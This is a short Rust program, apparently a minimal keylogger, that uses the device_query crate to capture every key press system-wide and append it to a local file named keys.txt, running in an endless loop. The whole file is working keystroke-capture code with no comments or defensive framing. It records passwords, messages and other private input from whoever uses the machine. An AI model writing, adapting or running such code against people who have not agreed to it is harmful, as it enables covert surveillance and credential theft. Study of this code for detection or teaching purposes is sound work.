use device_query::{DeviceEvents, DeviceQuery, DeviceState, Keycode};
use std::fs::OpenOptions;
use std::io::prelude::*;
use std::sync::Arc;
use std::sync::Mutex;
use std::thread::sleep;
use std::time::Duration;

fn main() {
    let device_state = DeviceState::new();
    let file = OpenOptions::new()
        .read(true)
        .append(true)
        .create(true)
        .open("keys.txt")
        .expect("");
    let wrapped_file = Arc::new(Mutex::new(file));

    let _guard = device_state.on_key_down(move|key| -> (){
        let k = match key {
            Keycode::Space => " ".to_owned(),
            Keycode::Enter => "\n".to_owned(),
            _ => key.to_string(),
        };
        let mut unwrapped = wrapped_file.lock().expect("msg");
        unwrapped.write_all((k).as_bytes())
            .expect("Unable to write data");
    });
    loop {
        sleep(Duration::from_millis(10000));
    }
}